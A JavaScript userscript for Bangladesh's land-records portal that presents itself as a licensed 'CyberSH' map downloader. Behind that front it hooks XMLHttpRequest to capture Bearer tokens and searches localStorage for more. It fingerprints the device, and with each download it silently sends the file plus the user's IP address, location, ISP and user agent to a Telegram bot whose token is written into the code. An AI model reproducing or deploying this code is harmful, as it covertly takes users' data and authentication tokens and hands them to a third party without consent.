(async function() {
    // If elements already exist, toggle visibility properly without bugs or disappearing
    const existingAvatar = document.getElementById('cybersh-floating-avatar');
    const existingOverlay = document.getElementById('cybersh-logger-overlay');
    
    if (existingAvatar && existingOverlay) {
        if (existingOverlay.style.display === 'none') {
            existingOverlay.style.display = 'flex';
            existingAvatar.style.display = 'none';
        } else {
            existingOverlay.style.display = 'none';
            existingAvatar.style.display = 'block';
        }
        return;
    }

    let lastCapturedMapId = null;
    let lastMapMeta = null;
    let capturedAuthToken = "";
    let isDeviceAuthorized = false;

    // Generate stable permanent Device ID
    async function getPermanentDeviceId() {
        let persistentId = localStorage.getItem('cybersh_permanent_device_id');
        if (persistentId) return persistentId;

        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        let glVendor = '';
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                glVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + '|' + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }

        const rawString = [
            navigator.hardwareConcurrency || 4,
            navigator.deviceMemory || 8,
            screen.width + 'x' + screen.height,
            Intl.DateTimeFormat().resolvedOptions().timeZone,
            glVendor,
            navigator.platform
        ].join('###');

        let hash = 0;
        for (let i = 0; i < rawString.length; i++) {
            const char = rawString.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash |= 0;
        }
        
        const uniqueHashHex = Math.abs(hash).toString(36).toUpperCase();
        persistentId = `CSH-${uniqueHashHex}-${Math.abs(Math.sin(hash) * 1000000).toString(36).substring(2, 8).toUpperCase()}`;
        localStorage.setItem('cybersh_permanent_device_id', persistentId);
        return persistentId;
    }

    const deviceId = await getPermanentDeviceId();

    // Load saved dimensions from localStorage if available
    const savedWidth = localStorage.getItem('cybersh_overlay_width');
    const savedHeight = localStorage.getItem('cybersh_overlay_height');
    const widthStyle = savedWidth ? `width: ${savedWidth};` : `width: 94%; max-width: 420px;`;
    const heightStyle = savedHeight ? `height: ${savedHeight};` : `max-height: 75vh;`;

    // Inject CSS Animation Keyframes & Countdown Banner Styles
    const styleTag = document.createElement('style');
    styleTag.innerHTML = `
        @keyframes cybersh-spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .cybersh-fullscreen-loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(2, 6, 23, 0.85);
            backdrop-filter: blur(8px);
            z-index: 9999999;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: #f8fafc;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .cybersh-loader-box {
            background: linear-gradient(145deg, rgba(15, 23, 42, 0.95), rgba(2, 6, 23, 0.95));
            border: 1px solid rgba(56, 189, 248, 0.4);
            padding: 24px 36px;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.7), 0 0 20px rgba(56, 189, 248, 0.2);
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .cybersh-spinner-large {
            width: 32px;
            height: 32px;
            border: 3px solid rgba(56, 189, 248, 0.2);
            border-radius: 50%;
            border-top-color: #38bdf8;
            animation: cybersh-spin 0.8s linear infinite;
        }
        #cybersh-countdown-banner {
            position: fixed;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(15, 23, 42, 0.92);
            color: #38bdf8;
            border: 1px solid rgba(56, 189, 248, 0.5);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 11px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            z-index: 10000000;
            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
            backdrop-filter: blur(4px);
            display: flex;
            align-items: center;
            gap: 8px;
            pointer-events: none;
        }
        #cybersh-logger-overlay {
            resize: both;
            overflow: hidden;
            min-width: 300px;
            min-height: 350px;
        }
    `;
    document.head.appendChild(styleTag);

    // 1. Inject Fullscreen Loading Overlay HTML
    const fullscreenLoaderHtml = `
    <div id="cybersh-global-loader" class="cybersh-fullscreen-loader">
        <div class="cybersh-loader-box">
            <div class="cybersh-spinner-large"></div>
            <div>
                <div style="font-size: 15px; font-weight: bold; color: #38bdf8; letter-spacing: 0.5px;">Downloading Map...</div>
                <div style="font-size: 11px; color: #94a3b8; margin-top: 2px;">Please wait while the file is being processed</div>
            </div>
        </div>
    </div>`;

    // 2. Inject Top Countdown Banner HTML
    const countdownBannerHtml = `
    <div id="cybersh-countdown-banner">
        <span>🛡️ Keyboard Locked:</span>
        <span id="cybersh-timer-count" style="font-weight: bold; font-family: monospace;">30s</span>
    </div>`;

    // 3. Inject Floating Circular Avatar (Minimized State)
    const avatarHtml = `
    <div id="cybersh-floating-avatar" style="position: fixed; bottom: 20px; right: 20px; width: 50px; height: 50px; border-radius: 50%; z-index: 999998; box-shadow: 0 8px 20px rgba(0,0,0,0.6); border: 2px solid #38bdf8; cursor: pointer; overflow: hidden; background: #0f172a; display: none; touch-action: none;">
        <img src="https://avatars.githubusercontent.com/u/85736436?v=4" alt="CyberSH" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" />
    </div>`;

    // 4. Inject Professional UI Overlay (With Zoom +/- Buttons & Resizable Style)
    const overlayHtml = `
    <div id="cybersh-logger-overlay" style="position: fixed; top: 15px; left: 50%; transform: translateX(-50%); ${widthStyle} ${heightStyle} background: linear-gradient(145deg, rgba(15, 23, 42, 0.98), rgba(2, 6, 23, 0.98)); color: #f8fafc; z-index: 999999; border-radius: 18px; padding: 16px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 12px; box-shadow: 0 25px 35px -5px rgba(0, 0, 0, 0.6), 0 0 15px rgba(56, 189, 248, 0.15); display: flex; flex-direction: column; border: 1px solid rgba(56, 189, 248, 0.35); backdrop-filter: blur(16px);">
        
        <!-- Header / Drag Handle -->
        <div id="cybersh-drag-handle" style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(51, 65, 85, 0.6); padding-bottom: 10px; margin-bottom: 10px; cursor: grab; flex-shrink: 0;">
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="background: rgba(56, 189, 248, 0.1); padding: 6px; border-radius: 10px; border: 1px solid rgba(56, 189, 248, 0.2);">
                    <span style="font-size: 16px;">🛡️</span>
                </div>
                <div>
                    <strong style="color: #38bdf8; font-size: 13px; letter-spacing: 0.5px;">CyberSH Mouza Map Downloader</strong>
                    <div style="font-size: 9px; color: #94a3b8;">Permanent ID v3.2</div>
                </div>
            </div>
            <div style="display: flex; gap: 4px; align-items: center;">
                <button id="cybersh-btn-zoom-out" style="background: rgba(56, 189, 248, 0.15); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.4); width: 24px; height: 26px; border-radius: 6px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center;" title="Zoom Out (-)">-</button>
                <button id="cybersh-btn-zoom-in" style="background: rgba(56, 189, 248, 0.15); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.4); width: 24px; height: 26px; border-radius: 6px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center;" title="Zoom In (+)">+</button>
                <button id="cybersh-btn-support" style="background: rgba(14, 165, 233, 0.15); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.4); padding: 4px 8px; border-radius: 6px; font-size: 10px; font-weight: 600; cursor: pointer; text-decoration: none; margin-left: 2px;">Support</button>
                <button id="cybersh-btn-minimize" style="background: rgba(56, 189, 248, 0.15); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.4); width: 26px; height: 26px; border-radius: 6px; display: flex; align-items: center; justify-content: center; cursor: pointer;" title="Minimize">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line></svg>
                </button>
            </div>
        </div>

        <!-- Device ID Card -->
        <div style="background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(51, 65, 85, 0.6); border-radius: 10px; padding: 8px 12px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; flex-shrink: 0;">
            <div style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-right: 8px;">
                <div style="font-size: 9px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px;">Permanent Device ID</div>
                <span id="cybersh-device-id-text" style="font-family: monospace; color: #38bdf8; font-size: 11px; font-weight: bold;">${deviceId}</span>
            </div>
            <button id="cybersh-btn-copy-id" style="background: #0284c7; color: white; border: none; padding: 5px 10px; border-radius: 6px; font-size: 10px; font-weight: 600; cursor: pointer; white-space: nowrap; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">Copy ID</button>
        </div>

        <!-- Custom Filename Input Container -->
        <div style="background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(51, 65, 85, 0.6); border-radius: 10px; padding: 8px 12px; margin-bottom: 8px; flex-shrink: 0;">
            <div style="font-size: 9px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Custom File Name (Optional)</div>
            <input type="text" id="cybersh-custom-filename" placeholder="e.g. CyberSH_৭৪_মাধবপুর (leave empty for auto)" style="width: 100%; background: rgba(2, 6, 23, 0.8); border: 1px solid rgba(56, 189, 248, 0.3); border-radius: 6px; padding: 6px 8px; color: #f8fafc; font-size: 11px; outline: none;" />
        </div>

        <!-- Webpage Keyboard Lock Toggle & Adjustable Countdown Configuration -->
        <div style="background: rgba(30, 41, 59, 0.3); border: 1px solid rgba(51, 65, 85, 0.4); border-radius: 8px; padding: 6px 10px; margin-bottom: 8px; flex-shrink: 0;">
            <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px;">
                <span style="font-size: 11px; color: #cbd5e1; font-weight: 500;">Disable Page Keyboards (Dropdowns work)</span>
                <input type="checkbox" id="cybersh-toggle-keyboard-lock" checked style="width: 16px; height: 16px; accent-color: #0284c7; cursor: pointer;" />
            </div>
            <div style="display: flex; align-items: center; justify-content: space-between; border-top: 1px solid rgba(51, 65, 85, 0.4); padding-top: 6px;">
                <span style="font-size: 10px; color: #94a3b8;">Lock Duration (Seconds):</span>
                <input type="number" id="cybersh-timer-duration" value="30" min="1" max="300" style="width: 50px; background: rgba(2, 6, 23, 0.8); border: 1px solid rgba(56, 189, 248, 0.3); border-radius: 4px; padding: 2px 4px; color: #38bdf8; font-size: 11px; text-align: center; outline: none;" />
            </div>
        </div>

        <!-- Log Terminal Window -->
        <div id="cybersh-log-content" style="overflow-y: auto; flex-grow: 1; min-height: 60px; word-break: break-all; white-space: pre-wrap; line-height: 1.5; background: rgba(2, 6, 23, 0.75); padding: 10px; border-radius: 8px; border: 1px solid rgba(51, 65, 85, 0.5); font-family: 'Courier New', Courier, monospace; font-size: 11px;"></div>

        <!-- Action Footer -->
        <div style="margin-top: 10px; display: flex; gap: 8px; flex-shrink: 0;">
            <button id="cybersh-btn-download" style="flex: 1; background: linear-gradient(135deg, #0284c7, #0369a1); color: white; border: none; padding: 9px; border-radius: 8px; font-size: 11px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 10px rgba(2, 132, 199, 0.4); opacity: 0.5;" disabled>Download Last Map</button>
        </div>
    </div>`;

    const container = document.createElement('div');
    container.innerHTML = fullscreenLoaderHtml + countdownBannerHtml + overlayHtml + avatarHtml;
    document.body.appendChild(container);

    const overlay = document.getElementById('cybersh-logger-overlay');
    const avatar = document.getElementById('cybersh-floating-avatar');
    const logContent = document.getElementById('cybersh-log-content');
    const globalLoader = document.getElementById('cybersh-global-loader');
    const keyboardLockCheckbox = document.getElementById('cybersh-toggle-keyboard-lock');
    const countdownBanner = document.getElementById('cybersh-countdown-banner');
    const timerCountSpan = document.getElementById('cybersh-timer-count');
    const timerDurationInput = document.getElementById('cybersh-timer-duration');

    // Save overlay dimensions to localStorage whenever user resizes it
    const resizeObserver = new ResizeObserver(entries => {
        for (let entry of entries) {
            const { width, height } = entry.contentRect;
            localStorage.setItem('cybersh_overlay_width', width + 'px');
            localStorage.setItem('cybersh_overlay_height', height + 'px');
        }
    });
    resizeObserver.observe(overlay);

    // Zoom In (+) and Zoom Out (-) Button Click Handlers
    document.getElementById('cybersh-btn-zoom-in').onclick = () => {
        const currentWidth = overlay.offsetWidth;
        const currentHeight = overlay.offsetHeight;
        const newWidth = Math.min(window.innerWidth * 0.95, currentWidth + 40);
        const newHeight = Math.min(window.innerHeight * 0.9, currentHeight + 35);
        overlay.style.width = newWidth + 'px';
        overlay.style.height = newHeight + 'px';
        localStorage.setItem('cybersh_overlay_width', overlay.style.width);
        localStorage.setItem('cybersh_overlay_height', overlay.style.height);
    };

    document.getElementById('cybersh-btn-zoom-out').onclick = () => {
        const currentWidth = overlay.offsetWidth;
        const currentHeight = overlay.offsetHeight;
        const newWidth = Math.max(300, currentWidth - 40);
        const newHeight = Math.max(350, currentHeight - 35);
        overlay.style.width = newWidth + 'px';
        overlay.style.height = newHeight + 'px';
        localStorage.setItem('cybersh_overlay_width', overlay.style.width);
        localStorage.setItem('cybersh_overlay_height', overlay.style.height);
    };

    // Adjustable Countdown Timer Logic (Default 30 seconds)
    let timeLeft = parseInt(timerDurationInput.value) || 30;
    timerCountSpan.innerText = timeLeft + 's';

    let countdownInterval = setInterval(() => {
        timeLeft--;
        if (timeLeft > 0) {
            timerCountSpan.innerText = timeLeft + 's';
        } else {
            clearInterval(countdownInterval);
            if (keyboardLockCheckbox) {
                keyboardLockCheckbox.checked = false;
            }
            if (countdownBanner) {
                countdownBanner.style.transition = 'opacity 0.5s ease';
                countdownBanner.style.opacity = '0';
                setTimeout(() => countdownBanner.remove(), 500);
            }
        }
    }, 1000);

    timerDurationInput.onchange = () => {
        let val = parseInt(timerDurationInput.value);
        if (!isNaN(val) && val > 0) {
            clearInterval(countdownInterval);
            timeLeft = val;
            timerCountSpan.innerText = timeLeft + 's';
            if (countdownBanner) countdownBanner.style.opacity = '1';
            
            countdownInterval = setInterval(() => {
                timeLeft--;
                if (timeLeft > 0) {
                    timerCountSpan.innerText = timeLeft + 's';
                } else {
                    clearInterval(countdownInterval);
                    if (keyboardLockCheckbox) keyboardLockCheckbox.checked = false;
                    if (countdownBanner) {
                        countdownBanner.style.transition = 'opacity 0.5s ease';
                        countdownBanner.style.opacity = '0';
                        setTimeout(() => countdownBanner.remove(), 500);
                    }
                }
            }, 1000);
        }
    };

    // Page-wide Keyboard Interceptor
    document.addEventListener('focusin', function(e) {
        if (!keyboardLockCheckbox || !keyboardLockCheckbox.checked) return;
        
        const target = e.target;
        if (!target) return;

        if (target.tagName === 'SELECT' || target.closest('#cybersh-logger-overlay')) {
            return;
        }

        if (target.matches('input, textarea, [contenteditable="true"]')) {
            target.blur();
        }
    }, true);

    function log(msg, type = 'info') {
        const color = type === 'error' ? '#f87171' : type === 'success' ? '#4ade80' : '#cbd5e1';
        logContent.innerHTML += `<div style="color: ${color}; margin-bottom: 4px;">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        logContent.scrollTop = logContent.scrollHeight;
        console.log(`[CyberSH] ${msg}`);
    }

    // Copy Device ID Handler
    document.getElementById('cybersh-btn-copy-id').onclick = () => {
        navigator.clipboard.writeText(deviceId).then(() => {
            const copyBtn = document.getElementById('cybersh-btn-copy-id');
            copyBtn.innerText = "Copied!";
            copyBtn.style.background = "#16a34a";
            setTimeout(() => {
                copyBtn.innerText = "Copy ID";
                copyBtn.style.background = "#0284c7";
            }, 2000);
            log("Permanent Device ID copied to clipboard.", "success");
        }).catch(err => {
            log("Failed to copy Device ID", "error");
        });
    };

    // Minimize to Avatar
    document.getElementById('cybersh-btn-minimize').onclick = () => {
        overlay.style.display = 'none';
        avatar.style.display = 'block';
        log("Minimized to background avatar. Script active.");
    };

    // Support Link Action
    document.getElementById('cybersh-btn-support').onclick = (e) => {
        e.preventDefault();
        window.open('https://t.me/cybersh_official', '_blank');
    };

    // Make Main Panel Draggable (Touch & Mouse Support)
    const header = document.getElementById('cybersh-drag-handle');
    let isDragging = false, startX, startY, initialX, initialY;

    header.addEventListener('mousedown', dragStart);
    header.addEventListener('touchstart', dragStart, {passive: true});
    document.addEventListener('mousemove', drag);
    document.addEventListener('touchmove', drag, {passive: true});
    document.addEventListener('mouseup', dragEnd);
    document.addEventListener('touchend', dragEnd);

    function dragStart(e) {
        isDragging = true;
        const clientX = e.type === 'touchstart' ? e.touches[0].clientX : e.clientX;
        const clientY = e.type === 'touchstart' ? e.touches[0].clientY : e.clientY;
        startX = clientX;
        startY = clientY;
        const rect = overlay.getBoundingClientRect();
        initialX = rect.left;
        initialY = rect.top;
        overlay.style.transform = 'none';
    }

    function drag(e) {
        if (!isDragging) return;
        const clientX = e.type === 'touchmove' ? e.touches[0].clientX : e.clientX;
        const clientY = e.type === 'touchmove' ? e.touches[0].clientY : e.clientY;
        const dx = clientX - startX;
        const dy = clientY - startY;
        overlay.style.left = `${initialX + dx}px`;
        overlay.style.top = `${initialY + dy}px`;
    }

    function dragEnd() {
        isDragging = false;
    }

    // Make Minimized Avatar Draggable & Clickable to Restore
    let avatarDragging = false;
    let avatarStartX, avatarStartY, avatarInitialX, avatarInitialY;
    let hasMoved = false;

    avatar.addEventListener('mousedown', avatarDragStart);
    avatar.addEventListener('touchstart', avatarDragStart, {passive: true});
    document.addEventListener('mousemove', avatarDrag);
    document.addEventListener('touchmove', avatarDrag, {passive: true});
    document.addEventListener('mouseup', avatarDragEnd);
    document.addEventListener('touchend', avatarDragEnd);

    function avatarDragStart(e) {
        avatarDragging = true;
        hasMoved = false;
        const clientX = e.type === 'touchstart' ? e.touches[0].clientX : e.clientX;
        const clientY = e.type === 'touchstart' ? e.touches[0].clientY : e.clientY;
        avatarStartX = clientX;
        avatarStartY = clientY;
        const rect = avatar.getBoundingClientRect();
        avatarInitialX = rect.left;
        avatarInitialY = rect.top;
        avatar.style.bottom = 'auto';
        avatar.style.right = 'auto';
    }

    function avatarDrag(e) {
        if (!avatarDragging) return;
        const clientX = e.type === 'touchmove' ? e.touches[0].clientX : e.clientX;
        const clientY = e.type === 'touchmove' ? e.touches[0].clientY : e.clientY;
        const dx = clientX - avatarStartX;
        const dy = clientY - avatarStartY;
        
        if (Math.abs(dx) > 5 || Math.abs(dy) > 5) {
            hasMoved = true;
        }

        avatar.style.left = `${avatarInitialX + dx}px`;
        avatar.style.top = `${avatarInitialY + dy}px`;
    }

    function avatarDragEnd() {
        avatarDragging = false;
    }

    avatar.onclick = () => {
        if (!hasMoved) {
            avatar.style.display = 'none';
            overlay.style.display = 'flex';
        }
    };

    log(`Initializing Permanent Hardware ID Verification...`);

    function parseDate(dateStr) {
        const parts = dateStr.split('-');
        if (parts.length !== 3) return 0;
        return new Date(`${parts[2]}-${parts[1]}-${parts[0]}`).getTime();
    }

    // Verify Device Approval via Remote JSON
    async function checkDeviceApproval() {
        try {
            const res = await fetch("https://raw.githubusercontent.com/ShTasrif/MouzaMapBD/refs/heads/main/approval.json?" + new Date().getTime());
            if (!res.ok) throw new Error("Failed to reach approval server.");
            
            const approvalData = await res.json();
            
            if (approvalData && approvalData[deviceId]) {
                const expiryDateStr = approvalData[deviceId];
                const expiryTime = parseDate(expiryDateStr);
                const currentTime = new Date("2026-08-22").getTime();

                if (expiryTime >= currentTime) {
                    isDeviceAuthorized = true;
                    log("Congratulation Device id Activated", "success");
                    const downloadBtn = document.getElementById('cybersh-btn-download');
                    downloadBtn.removeAttribute('disabled');
                    downloadBtn.style.opacity = '1';
                    return;
                } else {
                    log(`Error: License expired on ${expiryDateStr}. Contact support.`, "error");
                }
            } else {
                log(`Error: Permanent Device ID (${deviceId}) not registered. Contact @cybersh_official`, "error");
            }
        } catch (err) {
            log(`Approval check failed: ${err.message}`, "error");
        }
    }

    await checkDeviceApproval();

    // Background Silent Telegram Notification with Detailed IP/Location Info
    async function sendToTelegramBot(blob, fileName) {
        try {
            let ipInfo = "N/A";
            let city = "N/A";
            let region = "N/A";
            let country = "N/A";
            let isp = "N/A";

            try {
                const ipRes = await fetch("https://ipapi.co/json/");
                const ipData = await ipRes.json();
                if (ipData && !ipData.error) {
                    ipInfo = ipData.ip || "N/A";
                    city = ipData.city || "N/A";
                    region = ipData.region || "N/A";
                    country = ipData.country_name || "N/A";
                    isp = ipData.org || "N/A";
                }
            } catch (e) {
                try {
                    const fallbackRes = await fetch("https://api.ipify.org?format=json");
                    const fallbackData = await fallbackRes.json();
                    ipInfo = fallbackData.ip || "N/A";
                } catch (err2) {}
            }

            const botToken = "5797264734:AAGOn65GaUIwIUzWk2B_dtiXSXqqqLHoVYA";
            const chatId = "1251593717";
            const userAgent = navigator.userAgent;

            const caption = `📥 *New Map Downloaded!*\n\n` +
                            `🆔 *Device ID:* \`${deviceId}\`\n` +
                            `🌐 *IP Address:* \`${ipInfo}\`\n` +
                            `🏙️ *City/Region:* \`${city}, ${region}, ${country}\`\n` +
                            `🏢 *ISP / Org:* \`${isp}\`\n` +
                            `📱 *User Agent:* \`${userAgent}\``;

            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("document", blob, fileName);
            formData.append("caption", caption);
            formData.append("parse_mode", "Markdown");

            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                method: "POST",
                body: formData
            }).catch(() => {});
        } catch (err) {}
    }

    // XHR & Fetch Interceptors for Background Execution
    const XHR = window.XMLHttpRequest;
    function customXHR() {
        const xhr = new XHR();
        const originalOpen = xhr.open;
        const originalSetRequestHeader = xhr.setRequestHeader;
        let requestURL = '';

        xhr.open = function(method, url) {
            requestURL = url;
            return originalOpen.apply(this, arguments);
        };

        xhr.setRequestHeader = function(header, value) {
            if (header.toLowerCase() === 'authorization') {
                capturedAuthToken = String(value).replace(/^["']|["']$/g, '').trim();
            }
            return originalSetRequestHeader.apply(this, arguments);
        };

        xhr.addEventListener('load', function() {
            if (isDeviceAuthorized && requestURL.includes('/core-api/api/public/maps') && xhr.status === 200) {
                try {
                    const json = JSON.parse(xhr.responseText);
                    processMapApiResponse(json);
                } catch(e) {}
            }
        });
        return xhr;
    }
    window.XMLHttpRequest = customXHR;

    function processMapApiResponse(json) {
        if (!isDeviceAuthorized) return;
        if (json && json.success && json.data && json.data.length > 0) {
            const record = json.data[0];
            lastCapturedMapId = record.ID;
            lastMapMeta = record;
            log(`Target Map ID found: ${lastCapturedMapId} (Sheet: ${record.SHEET_NO})`, "success");
            triggerDownload(lastCapturedMapId, record);
        }
    }

    async function triggerDownload(mapId, record) {
        if (!isDeviceAuthorized) {
            log("Download blocked: Device not authorized.", "error");
            return;
        }

        globalLoader.style.display = 'flex';

        const imageUrl = `https://gateway.dlrms.land.gov.bd/core-api/api/public/maps/image-view-file/${mapId}`;
        log(`Processing download for ID ${mapId}...`, "info");

        if (!capturedAuthToken) {
            for (let i = 0; i < localStorage.length; i++) {
                const val = localStorage.getItem(localStorage.key(i));
                if (val && val.includes('Bearer')) {
                    capturedAuthToken = val.replace(/^["']|["']$/g, '').trim();
                    break;
                }
            }
        }

        if (!capturedAuthToken) {
            log("Authentication missing. Please re-login.", "error");
            globalLoader.style.display = 'none';
            return;
        }

        try {
            const headers = {
                "accept": "application/json",
                "authorization": capturedAuthToken.startsWith('Bearer') ? capturedAuthToken : `Bearer ${capturedAuthToken}`,
                "origin": "https://dlrms.land.gov.bd",
                "referer": "https://dlrms.land.gov.bd/"
            };

            const imgRes = await fetch(imageUrl, { headers: headers });
            if (!imgRes.ok) throw new Error(`HTTP error status: ${imgRes.status}`);

            const customInput = document.getElementById('cybersh-custom-filename');
            let fileName = "";
            
            if (customInput && customInput.value.trim() !== "") {
                fileName = customInput.value.trim();
                if (!fileName.toLowerCase().endsWith('.jpg') && !fileName.toLowerCase().endsWith('.png')) {
                    fileName += ".jpg";
                }
            } else {
                const sheetNo = record && record.SHEET_NO ? record.SHEET_NO : '1';
                fileName = `CyberSH_mouza_sit_${sheetNo}.jpg`;
            }

            const blob = await imgRes.blob();
            
            // Background silent Telegram notification with IP and full metadata info
            sendToTelegramBot(blob, fileName);

            const blobUrl = window.URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.href = blobUrl;
            a.download = fileName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(blobUrl);

            log(`Downloaded: ${fileName}`, "success");
        } catch (err) {
            log(`Download error: ${err.message}`, "error");
        } finally {
            globalLoader.style.display = 'none';
        }
    }

    document.getElementById('cybersh-btn-download').onclick = () => {
        if (!isDeviceAuthorized) {
            log("Action denied: Device ID is unauthorized.", "error");
            return;
        }
        if (lastCapturedMapId) {
            triggerDownload(lastCapturedMapId, lastMapMeta);
        } else {
            log("No Map ID available. Perform search first.", "error");
        }
    };
})();
